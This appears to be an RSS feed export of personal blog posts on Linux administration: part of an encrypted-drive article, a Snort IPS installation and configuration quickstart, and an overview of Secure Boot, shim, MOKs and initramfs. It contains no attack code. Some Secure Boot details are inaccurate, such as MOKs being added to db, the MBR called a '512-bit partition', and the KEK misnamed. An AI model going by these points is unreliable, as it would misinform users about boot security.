&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*_TgsDD7BK_fPitV0J31ywg.png&#34; alt=&#34;&#34;  /&gt;

You can query the inode information on a specific file with the following command:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ls -il file
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*nBvEce088HNvxUbcz1cF7w.png&#34; alt=&#34;&#34;  /&gt;

The inode number is on the leftmost column of output. In this case, it is &lt;code&gt;131079&lt;/code&gt;. Additionally, you can see the read, write, and execute permissions on the file with the owner and group associated with it.&lt;/p&gt;
&lt;p&gt;As an alternative, you can search for the file that is associated with a specific inode with this command:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;find / -inum 1234567 -ls
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*15DlndsZGVZ0Q9A3lAtXeg.png&#34; alt=&#34;&#34;  /&gt;

I was able to find the file &lt;code&gt;/tmp/test.txt&lt;/code&gt; that was associated with &lt;code&gt;131079&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&#34;duplicating-the-encrypted-drive&#34;&gt;Duplicating the Encrypted Drive&lt;/h2&gt;
&lt;p&gt;This command can be used to create an exact duplicate of &lt;code&gt;/dev/sdb&lt;/code&gt; in &lt;code&gt;/media/sdb.img&lt;/code&gt;.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;dd if=/dev/sdb of=/media/sdb.img
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;next-steps&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*hzoKv4rgFMHTAQtFFIcaYQ.png&#34; alt=&#34;&#34;  /&gt;

Next Steps&lt;/h1&gt;
&lt;p&gt;Moving forward, you can expand upon what was done in this article by implementing an added layer of abstraction and flexibility with &lt;a href=&#34;https://linuxconfig.org/linux-lvm-logical-volume-manager&#34;&gt;LVM&lt;/a&gt;. You can also continue to experiment with different ways of encrypting partitions such as those outlined in &lt;a href=&#34;https://www.baeldung.com/linux/encrypt-partition&#34;&gt;this article&lt;/a&gt;. There are many different ways to configure your system and I would encourage you to continue learning. Thank you for reading!&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Snort IPS Quickstart</title>
      <link>http://localhost:1313/ally-petitt/posts/2023-05-02_snort-ips-quickstart-27559ae01fae/</link>
      <pubDate>Tue, 02 May 2023 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ally-petitt/posts/2023-05-02_snort-ips-quickstart-27559ae01fae/</guid>
      <description>&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
&lt;p&gt;Snort is an open source Intrusion Prevention System (IPS) that detects malicious network traffic by comparing the network packets to a set of rules, often created by Snort and the community. Snort can be used as a packet sniffer, packet logger, and intrusion prevention system.&lt;/p&gt;
&lt;p&gt;In this article, I’ll go over some of the first steps of installing, configuring, and running Snort so that new users have a place to branch off of.&lt;/p&gt;
&lt;h1 id=&#34;quick-install&#34;&gt;Quick Install&lt;/h1&gt;
&lt;p&gt;You can install this on Ubuntu easily with the following command:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ sudo apt-get install snort
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;kali-linux&#34;&gt;Kali Linux&lt;/h2&gt;
&lt;p&gt;For my Kali friends, you might get the message that you’re unable to locate the &lt;code&gt;snort&lt;/code&gt; package when trying to install it. This happens because the repositories that your distribution looks into when searching for apt packages doesn’t contain &lt;code&gt;snort&lt;/code&gt;. To fix this, you can try to append the following repos to your &lt;code&gt;/etc/apt/sources.list&lt;/code&gt;.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;deb http://http.kali.org/kali kali-rolling main non-free contrib  
deb http://http.kali.org/kali sana main non-free contrib  
deb http://security.kali.org/kali-security sana/updates main contrib non-free  
deb http://old.kali.org/kali moto main non-free contrib
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Let the changes take effect and install Snort.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ sudo apt-get update  
$ sudo apt-get install snort
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;building-fromsource&#34;&gt;Building From Source&lt;/h1&gt;
&lt;p&gt;If you’re crazy enough to build Snort from the source code, this section is for you.&lt;/p&gt;
&lt;h2 id=&#34;installing-dependencies&#34;&gt;Installing Dependencies&lt;/h2&gt;
&lt;p&gt;Before you can build Snort, you must first install its dependencies. These are listed in their &lt;a href=&#34;https://github.com/snort3/snort3#dependencies&#34;&gt;README.md&lt;/a&gt; on GitHub, but for the sake of brevity, I’ll put some of them here. Keep in mind that some of the dependencies have more dependencies which is why some appear below and not in the documentation.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo apt update &amp;amp;&amp;amp; apt install -y gcc libpcre3-dev zlib1g-dev libluajit-5.1-dev   
libpcap-dev openssl libssl-dev libnghttp2-dev libdumbnet-dev   
bison flex libdnet autoconf libtool cmake
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;daq&#34;&gt;DAQ&lt;/h2&gt;
&lt;p&gt;Snort has another depenency called DAQ that needs to be installed. I’ll be downloading their latest release form GitHub and extracting it in a folder called &lt;code&gt;daq&lt;/code&gt;.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ wget https://github.com/snort3/libdaq/archive/refs/tags/v3.0.11.zip  
$ unzip v3.0.11.zip -d daq &amp;amp;&amp;amp; cd daq/libdaq-3.0.11
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;After downloading and extracting it, I’ll run &lt;code&gt;bootstrap&lt;/code&gt; to generate the configuration script and then proceed to install it.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ ./bootstrap  
$ ./configure &amp;amp;&amp;amp; make &amp;amp;&amp;amp; sudo make install
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;hwloc&#34;&gt;hwloc&lt;/h2&gt;
&lt;p&gt;Another dependency is &lt;code&gt;hwloc&lt;/code&gt;. You can find additional methods of installation on their &lt;a href=&#34;https://github.com/open-mpi/hwloc&#34;&gt;GitHub&lt;/a&gt; and &lt;a href=&#34;https://www.open-mpi.org/software/hwloc/v2.9/&#34;&gt;website&lt;/a&gt;. This is the way that I did it:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ git clone https://github.com/open-mpi/hwloc.git  
$ cd hwloc &amp;amp;&amp;amp; ./autogen.sh  
$ ./configure &amp;amp;&amp;amp; make &amp;amp;&amp;amp; sudo make install
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;openssl&#34;&gt;OpenSSL&lt;/h2&gt;
&lt;p&gt;If you don’t already have &lt;code&gt;openssl&lt;/code&gt; installed on your system, you could install it from source:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ git clone https://github.com/openssl/openssl.git &amp;amp;&amp;amp; cd openssl  
$ ./Configure &amp;amp;&amp;amp; make &amp;amp;&amp;amp; make test
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It is also possible to install it through &lt;code&gt;apt&lt;/code&gt;. You may still need to install some additional headers for Snort to work. For this, you can try&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ sudo apt install libssl-dev openssl
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;snort-install&#34;&gt;Snort Install&lt;/h2&gt;
&lt;p&gt;Finally, we can start building Snort. I’ll be building directly from their source code on GitHub. Following the instructions on their README.md in &lt;a href=&#34;https://github.com/snort3/snort3#readme&#34;&gt;GitHub&lt;/a&gt;, I clone their GitHub repository and run these commands:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ git clone https://github.com/snort3/snort3.git  
$ cd snort3
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then, I’ll build the program. You’ll need &lt;code&gt;cmake&lt;/code&gt; among other packages in order to do this, so I’ve included the install command for those packages.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ sudo apt install -y gcc cmake libpcre3-dev zlib1g-dev libluajit-5.1-dev libpcap-dev openssl libssl-dev libnghttp2-dev libdumbnet-dev bison flex autoconf libtool  
$ ./configure\_cmake.sh --prefix=$(pwd) --with-daq-libraries=/path/to/libdaq-3.0.11  
$ cd build  
$ make -j $(nproc) install
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;configuration&#34;&gt;Configuration&lt;/h1&gt;
&lt;h2 id=&#34;capturing-all-networktraffic&#34;&gt;Capturing all Network Traffic&lt;/h2&gt;
&lt;p&gt;To start, we’ll set our network adapter to run in promiscuous mode. This means that it will capture all packets on the network rather than only the ones that were assigned to be captured by it. This can be done through WiFi settings or through the command line.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ sudo ip link set wlan0 promisc on
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;modifying-the-configuration-file&#34;&gt;Modifying the Configuration File&lt;/h2&gt;
&lt;p&gt;Most configurations will go within &lt;code&gt;/etc/snort/snort.conf&lt;/code&gt;.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ sudo vim /etc/snort/snort.conf
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;There’s many configuration options within this file that are broken up into 9 sections. Most of our changes will be in section 1.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*pngRmEDDXcscoXuasWQFdQ.png&#34; alt=&#34;&#34;  /&gt;

On line 45 of the configuration file, we’ll change the value of &lt;code&gt;HOME_NET&lt;/code&gt; from &lt;code&gt;any&lt;/code&gt; to be the network that you would like to monitor. In my case, it is &lt;code&gt;192.168.1.0/24&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*uPIpmb3Q2AUJj3v3GkL2lQ.png&#34; alt=&#34;&#34;  /&gt;

I would encourage you to go through the other variables in the configuration file to include the ports and hosts that are running various services so that Snort can detect them and apply the rules to them.&lt;/p&gt;
&lt;p&gt;Rules are included in step #7. The syntax for rule files is &lt;code&gt;include /path/to/rule.rules&lt;/code&gt;. In this case, &lt;code&gt;$RULE_PATH&lt;/code&gt; refers to &lt;code&gt;/etc/snort&lt;/code&gt;. You can include multiple rule files and add your own under &lt;code&gt;/etc/snort/local.rules&lt;/code&gt; or whichever file name that you configure for you own rules. This structure allows you to compartmentalize various rule sets and keep them organized.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*Pz6IDFwxqQwrMWmZS83kQg.png&#34; alt=&#34;&#34;  /&gt;

As a side note, if you would like to download the latest community rules, you can find them at the &lt;a href=&#34;https://www.snort.org/downloads#rules&#34;&gt;official website&lt;/a&gt;. You would extract the tarball and add the rule files to your &lt;code&gt;/etc/snort/snort.conf&lt;/code&gt;.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ wget https://www.snort.org/downloads/community/snort3-community-rules.tar.gz  
$ tar -xf snort3-community-rules.tar.gz
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;running-snort&#34;&gt;Running Snort&lt;/h1&gt;
&lt;p&gt;Once you have your configuration file created, you can test that everything works with the following command:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ sudo snort -T -i wlan0 -c /etc/snort/snort.conf
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;You will get a lot of output. The most important pieces of information to be aware of in this output are the Snort rules. Here, you will be able to see how many were loaded in.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*4STD2kRrAx3xnRfCA7ALqA.png&#34; alt=&#34;&#34;  /&gt;

To actually run Snort as a daemon, you would change the &lt;code&gt;-T&lt;/code&gt; option to &lt;code&gt;-D&lt;/code&gt;.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ sudo snort -D -i eth0 -c /etc/snort/snort.conf  
Spawning daemon child...  
My daemon child 197993 lives...  
Daemon parent exiting (0)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;To verify that it is working, you can use &lt;code&gt;ps aux&lt;/code&gt;.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ ps aux | grep snort  
root 196973 0.0 0.3 450316 118644 ? Ssl 10:25 0:00 snort -D -i wlan0 -c /etc/snort/snort.conf
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;All alerts from Snort will be sent to &lt;code&gt;/var/log/snort/alert&lt;/code&gt; unless otherwise specified in a command line argument.&lt;/p&gt;
&lt;h1 id=&#34;moving-forward&#34;&gt;Moving Forward&lt;/h1&gt;
&lt;p&gt;For those who are interested in learning Snort on a deeper level, one recommendation is learning how to create your own rules and learning what the other configuration options are. It may be worth it to read their &lt;code&gt;man&lt;/code&gt; page as well to be aware of options available on the CLI. You can also combine Snort with a SIEM such as Splunk and other solutions like pfSense.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Digging into the Linux Secure Boot Process</title>
      <link>http://localhost:1313/ally-petitt/posts/2023-04-29_digging-into-the-linux-secure-boot-process-9631a70b158b/</link>
      <pubDate>Sat, 29 Apr 2023 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ally-petitt/posts/2023-04-29_digging-into-the-linux-secure-boot-process-9631a70b158b/</guid>
      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*6T29Pwj4dMhQiPRW.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;Linux Penguin&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
&lt;p&gt;This article will begin with a high-level overview of the Ubuntu boot process and will continue to dig deeper into the role of SecureBoot in it when enabled. Some of the concepts I will be covering include shim, EFI variables, and MOKs. The information presented here was aggregated from the sources listed at the bottom of this article. Commands and example output will also be included to help present the topic in a more comprehensive way.&lt;/p&gt;
&lt;p&gt;Understanding the boot process along with SecureBoot is important because without adequate understanding of the inner-workings of a Linux system, it can be very easy to accidentally brick the system when attempting to enable settings such as SecureBoot. These are low-level operations that can do a lot of damage.&lt;/p&gt;
&lt;p&gt;I would encourage Windows users to reference &lt;a href=&#34;https://learn.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-secure-boot&#34;&gt;this documentation&lt;/a&gt; for Secure Boot information relating to Windows.&lt;/p&gt;
&lt;h2 id=&#34;typical-bootprocess&#34;&gt;Typical Boot Process&lt;/h2&gt;
&lt;p&gt;When an Ubuntu machine boots, it goes through &lt;a href=&#34;https://wiki.ubuntu.com/Booting&#34;&gt;4 main phases&lt;/a&gt;.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;BIOS phase&lt;/strong&gt;- firmware on motherboard, typically stored as a form of read only memory (ROM), contains code to initialize the hardware components of the computer and obtain the code for the bootloader.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Bootloader phase&lt;/strong&gt;- loads the operating system into memory along with an inital ram disk filesystem (&lt;a href=&#34;https://www.kernel.org/doc/html/latest/admin-guide/initrd.html&#34;&gt;initrd&lt;/a&gt;).&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Kernel phase&lt;/strong&gt;- the kernel executes the init script inside the initrd filesystem. This loads hardware drivers and mounts the root partition.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;System startup&lt;/strong&gt;- the operating system loads system daemons and services, sets up the network, mounts file systems, starts system logging, and performs other initialization tasks.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;It is common for a 512-bit partition to be present on Linux systems called the Master Boot Record (MBR). This partition contains the bootloader (GRUB, LILO, yaboot, or others) and boot records. This is one of the places that Linux can be booted from. Other locations include a bootloader from a storage device like USB flash drive or CDR or a bootloader that is transferred over the network such as with Preboot Execution Environment (&lt;a href=&#34;https://en.wikipedia.org/wiki/Preboot_Execution_Environment&#34;&gt;PXE&lt;/a&gt;).&lt;/p&gt;
&lt;h2 id=&#34;secure-boot&#34;&gt;Secure Boot&lt;/h2&gt;
&lt;p&gt;Secure Boot is a security standard. When the computer is turned on, the Secure Boot process begins with firmware in the motherboard, which will check the cryptographic signatures of each of the boot files. This includes UEFI firmware drivers (aka optional ROMs), EFI applications, and the operating system. Once verified, the computer boots and the firmware gives control to the operating system.&lt;/p&gt;
&lt;h2 id=&#34;shim&#34;&gt;Shim&lt;/h2&gt;
&lt;p&gt;When enabling Secure Boot, it is important to understand shim. In the context of SecureBoot, a shim is a pre-bootloader program that is designed to work with Secure Boot firmware. It allows for bootloaders and kernel modules to be loaded and executed if they are not included in the Secure Boot database. In Ubuntu, the shim loader is pre-installed and signed by the Microsoft certificate authority.&lt;/p&gt;
&lt;p&gt;Secure Boot uses asymmetrical cryptography, meaning that a public and private key are used. The key pair can be generated by the user and the private key is used to sign all programs that are allowed to run, including the GRUB bootloader. The firmware on the BIOS or UEFI will use the public key to verify the checksums and signatures of programs before allowing them to execute.&lt;/p&gt;
&lt;p&gt;You can check the signatures of your own shim loader with the &lt;code&gt;sbverify&lt;/code&gt; command that comes with the &lt;code&gt;sbsigntool&lt;/code&gt; package.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# locate your shim binary  
$ SHIM=$(sudo find /boot/efi/EFI/ -iname &amp;#34;shim*&amp;#34; 2&amp;gt;/dev/null)  
$ sbverify $SHIM  
Signature verification OK
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;uefi-variables&#34;&gt;UEFI variables&lt;/h2&gt;
&lt;p&gt;Another concept to be familiar with is the UEFI variables which are stored in firmware non-volatile RAM (NV-RAM). These variables store various data such as boot order preferences, timeout values, network settings, storage device details, and Secure Boot settings. Each UEFI variable will have its own binary file under &lt;code&gt;/sys/firmware/efi/efivars/&lt;/code&gt;. The naming convention for these files is the variable name followed by the vendor GUID. For example,&lt;code&gt;SecureBoot-8be4df61–93ca-11d2-aa0d-00e098032b8c&lt;/code&gt;may be used to store whether Secure Boot is enabled (0x01) or disabled (0x00).&lt;/p&gt;
&lt;p&gt;You can view some of these variables by either listing the contents of &lt;code&gt;/sys/firmware/efi/efivars/&lt;/code&gt; or using the &lt;code&gt;[efivarfs](https://manpages.org/efivar)&lt;/code&gt; tool to list and read the values.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ sudo apt-get install efivar   
$ sudo efivar -p -n 8be4df61-93ca-11d2-aa0d-00e098032b8c-SecureBoot 1 ⨯
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*NorYyiqugzWJsb0pbGlbmA.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;Example output of the above command&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;In this particular example, the value of the UEFI variable &lt;code&gt;SecureBoot&lt;/code&gt; is 0x01, which indicates that it is currently enabled. Some of the other important variables for Secure Boot are the following:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;8be4df61-93ca-11d2-aa0d-00e098032b8c-PKDefault  
8be4df61-93ca-11d2-aa0d-00e098032b8c-KEKDefault  
8be4df61-93ca-11d2-aa0d-00e098032b8c-dbDefault  
8be4df61-93ca-11d2-aa0d-00e098032b8c-dbxDefault
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;These values pertain to the key databases which are used to determine whether or not a module is safe to load.&lt;/p&gt;
&lt;h2 id=&#34;secure-boot-databases&#34;&gt;Secure Boot Databases&lt;/h2&gt;
&lt;p&gt;Secure Boot utilizes 4 key databases. You can read more about them in the &lt;a href=&#34;https://uefi.org/sites/default/files/resources/UEFI_Spec_2_9_2021_03_18.pdf&#34;&gt;official specifications&lt;/a&gt; or see a summary here:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Allowed Signature Database (db)&lt;/strong&gt;- contains a list of cryptographic signatures that are allowed to load during the boot process.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Disallowed Signature Database (dbx)&lt;/strong&gt;- contains a list of the cryptographic signatures that are not allowed to be loaded during the boot process.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Key Enrollment Key Database (KEK)&lt;/strong&gt;- contains the key exchange keys used to authenticate other databases.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Platform Key Database (PK)&lt;/strong&gt;- contains the public key that is used to verify the signature of any bootloader or firmware that has been signed with its corresponding private key. The recommended platform key on UEFI is RSA-2048.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The key databases essentially set the rules for which signatures are allowed to be loaded and which are not. This is important in Secure Boot because it helps to verify the integrity of modules before they are executed.&lt;/p&gt;
&lt;h2 id=&#34;machine-owner-keysmoks&#34;&gt;Machine Owner Keys (MOKs)&lt;/h2&gt;
&lt;p&gt;Another component of the boot process is Machine Owner Keys (MOKs). MOKs are an extra database of keys that can be managed by the user. This is separate from the certificate authority key that comes shipped with shim. They give the user more control over which modules can be loaded. For example, when a user enrolls a MOK on the system, the key associated with it is added to the allowed signature database (db). This means that any binary signed with that key will be trusted by the firmware during the boot process.&lt;/p&gt;
&lt;p&gt;These are typically located in the&lt;code&gt;/var/lib/shim-signed/mok/&lt;/code&gt; directory under the names &lt;code&gt;MOK.der&lt;/code&gt;, &lt;code&gt;MOK.pem&lt;/code&gt; or &lt;code&gt;MOK.priv&lt;/code&gt;. If you don’t have MOK keys and would like to generate them, the following commands can be used:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# mkdir -p /var/lib/shim-signed/mok/  
# cd /var/lib/shim-signed/mok/  
# openssl req -new -x509 -newkey rsa:2048 -keyout MOK.priv -outform DER -out MOK.der -days 36500 -subj &amp;#34;/CN=My Name/&amp;#34;  
# openssl x509 -inform der -in MOK.der -out MOK.pem
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;By default, shim provides a management utility called MokManager that can be used to, “enroll keys, remove trusted keys, enroll binary hashes and toggle Secure Boot validation at the shim level,” as described by the &lt;a href=&#34;https://wiki.ubuntu.com/UEFI/SecureBoot&#34;&gt;Ubuntu documentation&lt;/a&gt;. Note that a password is typically required when using the MokManager to authenticate the user that is using it.&lt;/p&gt;
&lt;p&gt;MokManager will help to properly configure the keys when key management is required. Once key management has been completed, the system will reboot to enable the key management changes. If things go well, it will continue to boot as expected without a MokManager screen.&lt;/p&gt;
&lt;h2 id=&#34;bootloader-configurations-and-information&#34;&gt;Bootloader Configurations and Information&lt;/h2&gt;
&lt;p&gt;You can futher investigate your Linux machine’s boot process. One way to do this is to view the &lt;code&gt;/proc/cmdline&lt;/code&gt; file. This contains the kernel boot command line arguments that were passed to the kernel during the boot process.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ cat /proc/cmdline  
# example output  
BOOT\_IMAGE=/boot/vmlinuz-5.11.0-16-generic root=UUID=12345678-1234-1234-1234-1234567890AB ro quiet splash
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This command will output the path to the kernel image file that is loaded by the bootloader via &lt;code&gt;BOOT_IMAGE&lt;/code&gt;. The &lt;code&gt;quiet splash&lt;/code&gt; option at the end is commonly used by the GRUB bootloader to specify to suppress verbose boot messages and display a graphical boot splash screen.&lt;/p&gt;
&lt;p&gt;A &lt;strong&gt;kernel image&lt;/strong&gt; is a binary file of the operating system core. It contains contains the necessary code and data structures to boot the system, manage memory, handle input/output operations, and execute user programs. They can be used by the bootloader to start the OS. The name of the kernel image will typically represent its version and architecture. For instance, the kernel image &lt;code&gt;vmlinuz-5.4.0–1042-aws&lt;/code&gt; is version &lt;code&gt;5.4.0–1042&lt;/code&gt; running on AWS archtecture.&lt;/p&gt;
&lt;p&gt;The bootloader contains its own file system drivers (initramfs) that you can view if you know the &lt;code&gt;/boot/initrd*&lt;/code&gt; file that corresponds to the kernel image in use. The easiest way to do this is with the tools from &lt;code&gt;[initramfs-tools-core](https://packages.debian.org/initramfs-tools-core &amp;quot;DebianPackage&amp;quot;)&lt;/code&gt;:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;## list files inside the initramfs  
$ lsinitramfs /boot/initrd.img-$(uname -r)  
.  
kernel  
kernel/x86  
.  
bin  
conf  
conf/arch.conf  
conf/conf.d  
conf/conf.d/resume  
-- snip --  
  
## extract files from the initramfs  
$ unmkinitramfs /boot/initrd.img-$(uname -r) initramfs/
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This allows you to navigate the initramfs filesystem and gain a deeper understanding of how things are working as the system boots. If you extracted &lt;code&gt;initramfs&lt;/code&gt;, you’ll notice that upon looking in the directory &lt;code&gt;./initramfs&lt;/code&gt;, there are 3 folders: &lt;code&gt;early&lt;/code&gt;, &lt;code&gt;early2&lt;/code&gt;, and &lt;code&gt;main&lt;/code&gt;.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ ls initramfs  
early early2 main
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the context of initramfs, &lt;code&gt;early&lt;/code&gt; and &lt;code&gt;early2&lt;/code&gt; refer to the first and second stage of the initial RAM filesystem. During the first stage, the minimal set of drivers and utilities that are needed to initialize the hardware and mount the real root filesystem are loaded. In the second stage, &lt;code&gt;early2&lt;/code&gt;, loads additional drivers and utilities needed to fully initialize the system.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;main&lt;/code&gt; folder of initramfs contains the actual root filesystem image, as well as any additional tools or drivers that may be needed during the boot process. Once the root filesystem has been mounted, the system can proceed to load the regular set of services and daemons needed to run the operating system.&lt;/p&gt;
&lt;h2 id=&#34;checking-signatures-manually&#34;&gt;Checking Signatures Manually&lt;/h2&gt;
&lt;p&gt;You can check which modules are digitally signed using the &lt;code&gt;modinfo&lt;/code&gt; command where a kernel’s signature will appear as a long string of hexadecimal values separated by colons.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ modinfo example.ko  
filename: /lib/modules/5.10.0-5-amd64/kernel/drivers/misc/example.ko  
version: 1.0.0  
license: GPL  
description: Example kernel module  
author: John Doe &amp;lt;jdoe@example.com&amp;gt;  
srcversion: 12AB34CD5678EF90ABCD1234  
sig\_key: A0:3B:22:33:44:55:66:77:88:99:AA:BB:CC:DD:EE:FF  
sig\_hashalgo: sha256  
signature: 12:34:56:78:90:AB:CD:EF:12:34:56:78:90:AB:CD:EF:12:34:56:78:90:AB:CD:EF:12:34:56:78:90:AB:CD:EF:12:34:56:78:90:AB:CD:EF:12:34:56:78:90:AB:CD:EF:12:34:56:78:90:AB:CD:EF:12:34:56:78:90:AB:CD:EF:12:34:56:78:90:AB:CD:EF:12:34:56:78:90:AB:CD:EF
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;Thanks for reading this overview of Secure Boot. I would encourage you to do further reading in the sources linked below because this article only scratched the surface. I hope that from this article you were able to come to appreciate the beautifully complex system of a Linux machine turning on.&lt;/p&gt;
&lt;h1 id=&#34;sources&#34;&gt;Sources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://wiki.ubuntu.com/UEFI/SecureBoot&#34;&gt;Ubuntu’s wiki&lt;/a&gt; on Secure Boot (detailed)&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://wiki.ubuntu.com/Booting&#34;&gt;Ubuntu’s wiki on Booting Process&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html&#34;&gt;Linux Documentation- Kernel Module Signing&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://youtu.be/WRFnOh_pqX8&#34;&gt;Mike Danslegio Explains Secure Boot&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/User_space_and_kernel_space&#34;&gt;User Space and Kernel Space in Linux&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.kernel.org/doc/html/latest/filesystems/ramfs-rootfs-initramfs.html&#34;&gt;Kernel.org- Ramfs, rootfs, and initramfs&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://wiki.debian.org/SecureBoot&#34;&gt;SecureBoot Debian Wiki&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://itsfoss.com/check-uefi-or-bios/&#34;&gt;Check UEFI or BIOS&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.kernel.org/doc/html/latest/admin-guide/initrd.html&#34;&gt;Using the initial RAM disk (initrd)&lt;/a&gt;&lt;/li&gt;
